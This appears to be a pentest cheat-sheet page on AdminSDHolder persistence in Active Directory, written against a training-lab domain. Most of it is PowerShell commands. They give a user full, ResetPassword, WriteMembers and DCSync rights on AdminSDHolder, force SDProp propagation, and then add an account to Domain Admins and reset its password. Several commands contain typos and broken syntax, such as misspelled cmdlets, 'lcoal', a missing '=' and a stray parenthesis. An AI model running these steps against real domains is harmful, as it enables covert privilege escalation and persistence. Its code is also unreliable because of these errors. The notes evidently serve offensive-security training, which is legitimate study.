# AdminSDHolder

AdminSDHolder is a system container that used to control permissions.\
These permissions are used as a template for protected accounts to prevent modifications to them. \\

**Security Descriptor Propagator** (SDPROP) runs every 60 minutes.\
SDPROP compares between the ACL of the protected groups and members and the ACL of **AdminSDHolder**, then any differences are overwritten on the ACL Object.

## Exploitation

An attacker can utilize SDROP mechinsem by adding a user with GenericAll privileges\
to theAdminSD Holder object. When the SDPROP runs (every 60 minutes) the user will be add with elevated privileges. Adding user to the AdminSDHolder object.

{% code overflow="wrap" %}
```powershell
# Full privs
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dcdollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose

# Reset Password priv
Add-DomainObjectAcl -TargetIdentity
'CN=AdminSDHolder,CN=System,dc=dollarcorp,dc=moneycorp,dc=loc
al' -PrincipalIdentity student1 -Rights ResetPassword -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose

# Write Members priv
Add-DomainObjectAcl -TargetIdentity
'CN=AdminSDHolder,CN=System,dc=dollarcorp,dc=moneycorp,dc=loc
al' -PrincipalIdentity student1 -Rights WriteMembers -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose

# DC Sync priv
Add-DomainObjectAcl -TargetIdentity
'CN=AdminSDHolder,CN=System,dc=dollarcorp,dc=moneycorp,dc=loc
al' -PrincipalIdentity student1 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```
{% endcode %}

Use tool called [RACE ](https://github.com/samratashok/RACE)to add the privileges easily through commandline.

Run SDProp mannually. If GUI access is availabe, the above privileges can be added easily through GUI.

## Propagate Manually

```powershell
Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose

# pre-Server 2008 machines
Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose
```

```powershell
# OR it can be used like below
$sess = New-PSSession -Computername dcorp-dc
Invoke-Comamnd -Session $sess -FilePath C:\AD\Tools\Invoke-SDPropagator.ps1
Invoke-Command -ScriptBlock{Invoke-SDPropagator -showProgress -Verbose -timeoutMinutes 1} -Session $sess
```

### Verify Propagation

{% tabs %}
{% tab title="PowerView" %}
```powershell
Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | For-Each-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Cpnvert-SidToName $_.SecurityIdentifier);$_)} | ?{$_.IdentityName -match "studentxx"}
```
{% endtab %}

{% tab title="AD Module" %}
```powershell
(Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=lcoal').Access | ?{$_.IdentityReference -match 'studentxx'}
```
{% endtab %}
{% endtabs %}

## Abusing rights

{% tabs %}
{% tab title="PowerView" %}
```powershell
# Add user to DA group
Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose

# Reset Password
Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
```
{% endtab %}

{% tab title="AD Module" %}
```powershell
# Add user to DA group
Add-ADGroupMember -Identity 'Domain Admins' -Members testda

# Reset Password
Set-ADAccountPassword -Identity testda -NewPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
```
{% endtab %}
{% endtabs %}
